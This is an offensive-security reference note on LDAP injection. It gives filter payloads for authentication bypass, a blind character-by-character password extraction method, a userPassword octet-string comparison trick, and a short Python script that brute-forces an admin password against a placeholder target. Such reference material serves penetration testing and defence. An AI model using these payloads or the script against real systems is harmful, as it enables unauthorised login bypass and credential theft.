---
title: "LDAP Injection"
type: technique
tags: [active-directory, exploitation, injection, web]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-05-13
sources: [payloadsallthethings-ldapinjection]
---

# LDAP Injection

## What it is
LDAP Injection is an attack used to exploit web-based applications that construct LDAP (Lightweight Directory Access Protocol) statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements to bypass authentication or extract sensitive information.

## Methodology

### Authentication Bypass
Attempt to manipulate the filter logic by injecting always-true conditions using logical operators (`&`, `|`, `!`).

**Examples:**
```text
user  = *)(uid=*))(|(uid=*
pass  = password
query = (&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
```

```text
user  = admin)(!(&(1=0
pass  = q))
query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
```

### Blind Exploitation
This technique is similar to blind SQL injection, using character-based brute-forcing to discover sensitive information (like passwords). It relies on the fact that LDAP filters respond differently (True/False) based on whether conditions match, without directly revealing the data.

```text
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
```
**Breakdown**:
- `&`: Logical AND operator.
- `(sn=administrator)`: Matches surname `administrator`.
- `(password=X*)`: Matches password starting with `X` (case-sensitive).

### Exploiting userPassword Attribute
The `userPassword` attribute is an OCTET STRING, meaning it's not easily brute-forced as a normal string. However, you can use the `octetStringOrderingMatch` (OID `2.5.13.18`) to perform bit-by-bit comparison (in big-endian ordering) of two octet string values until a difference is found.

```text
userPassword:2.5.13.18:=\xx (\xx is a byte)
userPassword:2.5.13.18:=\xx\xx
userPassword:2.5.13.18:=\xx\xx\xx
```

## Payloads / Examples

### Default Attributes
These can be used in an injection like `*)(ATTRIBUTE_HERE=*`
- `userPassword`
- `surname`
- `name`
- `cn`
- `sn`
- `objectClass`
- `mail`
- `givenName`
- `commonName`

### Python Blind LDAP Exploit
```python
import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    for char in alphabet:
        r = requests.get("http://target.web?action=dir&search=admin*)(password=" + flag + char)
        if ("TRUE CONDITION" in r.text):
            flag += char
            print("[+] Flag: " + flag)
            break
```
